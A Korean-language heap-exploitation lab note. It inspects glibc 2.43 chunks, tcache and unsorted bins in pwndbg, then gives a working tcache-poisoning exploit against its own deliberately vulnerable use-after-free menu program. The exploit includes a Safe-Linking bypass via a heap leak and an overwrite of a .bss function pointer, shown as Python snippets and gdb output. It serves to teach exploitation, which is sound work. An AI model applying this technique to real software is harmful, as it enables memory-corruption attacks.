# 05 · UAF → tcache poisoning + heap 내부 관찰

두 파일:
- `heap_demo.c` : gdb로 **힙 구조만** 들여다보는 데모 (`make debug`)
- `vuln.c` / `exploit.py` : UAF 메뉴 프로그램 + 실제 **tcache poisoning** 익스

환경 glibc **2.43** → **Safe-Linking(2.32+)** 적용. 그래서 heap leak이 필요.

---

## A. heap_demo로 chunk / bin 관찰 (`make debug`)

데모는 0x30 청크 3개 + 0x500 1개를 만들고 일부를 free한 뒤 `breakpoint_here()`에서 멈춤.
```c
free(a); free(b);   // tcache[0x40]에 2개
free(big);          // 0x510 → unsorted bin
```

### `heap` — 전체 chunk
```
Free chunk (tcachebins) | PREV_INUSE   Addr: 0x405000  Size: 0x40   fd: 0x405
Free chunk (tcachebins) | PREV_INUSE   Addr: 0x405040  Size: 0x40   fd: 0x405415
Allocated chunk         | PREV_INUSE   Addr: 0x405080  Size: 0x40
Free chunk (unsortedbin)| PREV_INUSE   Addr: 0x4050c0  Size: 0x510
                                       fd: 0x7ffff7fa3ac8  bk: 0x7ffff7fa3ac8
Allocated chunk         | PREV_INUSE   Addr: 0x4055d0  Size: 0x30
Top chunk               | PREV_INUSE   Addr: 0x405900  Size: 0x20700
```
- `Size: 0x40 (0x41)` → 실제 크기 0x40, **끝 1 = PREV_INUSE**(앞 chunk 사용중).
- unsorted chunk의 `fd=bk=0x7ffff7fa3ac8` → **libc의 main_arena+8**. 혼자 있을 땐
  자기 머리(arena)를 가리킴 → **이걸 읽으면 libc leak**.

### `tcachebins`
```
tcachebins
0x40 [  2]: 0x405050 —▸ 0x405010 ◂— 0
```
0x40 bin에 2개(LIFO: 나중에 free한 b가 머리). **next 포인터는 chunk 헤더가 아니라
mem(=데이터 시작)을 가리킴**: 0x405050 = b의 mem, 0x405010 = a의 mem.

### `unsortedbin`
```
all: 0x4050c0 —▸ 0x7ffff7fa3ac8 (main_arena+8) ◂— 0x4050c0
```

### Safe-Linking 숫자 뜯어보기 (`x/4gx`)
```
a(0x405000): 0x0..0 0x0..41 | next=0x405              key=0x0067819155d78783
b(0x405040): 0x0..0 0x0..41 | next=0x405415           key=0x0067819155d78783
```
저장식: `stored = (next필드_주소 >> 12) ^ 실제_다음_mem`
- a는 리스트의 끝(실제 next=0): `stored = (0x405010>>12) ^ 0 = 0x405` ✅
- b는 a를 가리킴: `(0x405050>>12) ^ 0x405415 = 0x405010` = a.mem ✅ (gdb `p/x`로 검산)
- `key`(2.34+ 랜덤값): free 시 이게 박혀 있으면 double free 의심 → bin 탐색.

**핵심**: a처럼 bin의 마지막 원소는 `stored = mem>>12` → **읽기만 해도 heap 주소 상위비트 leak**.

---

## B. tcache poisoning 익스 (`make run`)

메뉴 프로그램(`vuln.c`)은 UAF: free 후 포인터를 안 지움 → freed chunk를 edit/view 가능.
목표: `.bss`의 함수 포인터 `fp`를 `win`으로 덮어 `exit` 선택 시 `fp()` 호출.

### 1) heap leak (safe-linking 때문에 필수)
```python
alloc(0); free(0)
leak = u64(view(0))        # freed chunk의 next = (mem>>12)  (리스트에 혼자라 next=0)
heap = leak << 12          # mem 주소 복원
# 실측: leak=0x17758 → heap≈0x17758000
```

### 2) next를 &fp로 mangle해서 덮기
```python
target = e.symbols['fp']
edit(0, p64((heap >> 12) ^ target))   # PROTECT(ptr)=(pos>>12)^ptr, pos=이 chunk mem=heap
```

### 3) 두 번 alloc → 두 번째가 &fp 반환
```python
alloc(1)                    # 원래 chunk 꺼냄
alloc(2)                    # tcache next 따라가 &fp 반환 → notes[2]=&fp
edit(2, p64(e.symbols['win']))   # *fp = win
```
> mangle을 안 하거나 복원값이 16정렬이 아니면 `malloc(): unaligned tcache chunk detected`로 죽음.
> `&fp`가 16정렬이어야 함(여기선 0x4040e0 → OK).

### 4) 트리거 → 쉘
```
$ make run
[+] leak=0x17758  heap(mem)≈0x17758000
PWNED
```

### gdb로 poisoning 확인 포인트
```
pwndbg> tcachebins            # 1)2) 후 → next가 &fp(0x4040e0)로 보이는지
0x40 [ ...]: 0x... —▸ 0x4040e0 ◂— ...
pwndbg> x/gx &fp              # 3) 후 win 주소가 들어갔는지
0x4040e0: 0x00000000004011c6
```

---

## 버전 주의
- 이 환경은 glibc **2.43**. 공략노트의 2.27 "평문 tcache"와 달리 **safe-linking + key**가 있음.
- 2.34부터 `__free_hook`/`__malloc_hook` **없음** → 그래서 여기선 hook 대신 `.bss` 포인터를 탐.
- 문제 서버 libc 버전에 맞춰 디버깅해야 숫자가 맞음(`patchelf`/docker).
